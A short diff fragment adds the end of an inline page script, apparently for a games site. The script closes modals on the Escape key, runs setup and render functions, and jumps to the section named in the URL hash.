+    document.addEventListener("keydown", e => {
+      if (e.key === "Escape") {
+        $("#gameModal").classList.remove("open");
+        if (localStorage.getItem("nv_seen")) $("#signupModal").classList.remove("open");
+      }
+    });
+
+    buildCategories();
+    ensureMissions();
+    renderGames();
+    renderTables();
+    updateUI();
+
+    const hash = location.hash.replace("#", "");
+    if (hash && $(`#${hash}`)) go(hash);
+  </script>
 </body>
 </html>
